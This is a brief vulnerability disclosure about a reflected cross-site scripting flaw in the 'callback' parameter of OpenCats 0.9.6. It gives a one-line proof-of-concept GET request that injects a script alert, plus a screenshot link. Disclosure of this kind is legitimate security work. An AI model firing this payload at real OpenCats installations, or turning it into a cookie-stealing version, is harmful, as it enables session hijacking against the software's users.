# Cross Site Scripting vulnerability in the OpenCats 'callback'.


OpenCats version 0.9.6 PHP7.2 suffers from reflected XSS vulnerability.
This allows attackers arbitrary JavaScript injection, which compromises secure session between client and server.


### PoC

``` GET /index.php?m=toolbar&callback=<script>alert`xss`</script>&a=authenticate ```

![XSS](https://user-images.githubusercontent.com/57464251/192359649-990ad881-5fd0-46d5-ae03-724d57bde8c3.png)
